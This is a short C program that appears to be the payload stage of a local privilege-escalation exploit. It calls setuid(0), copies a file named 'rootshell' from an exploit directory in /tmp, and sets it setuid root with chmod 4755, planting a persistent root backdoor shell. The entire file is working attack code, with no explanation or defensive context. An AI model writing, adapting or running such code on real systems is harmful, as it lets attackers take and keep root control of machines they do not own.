#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main()
{
   setuid( 0 );
   system("cp /tmp/exploit/rootshell /tmp/rs");
   system( "chmod 4755 /tmp/rs");
   return 0;
}
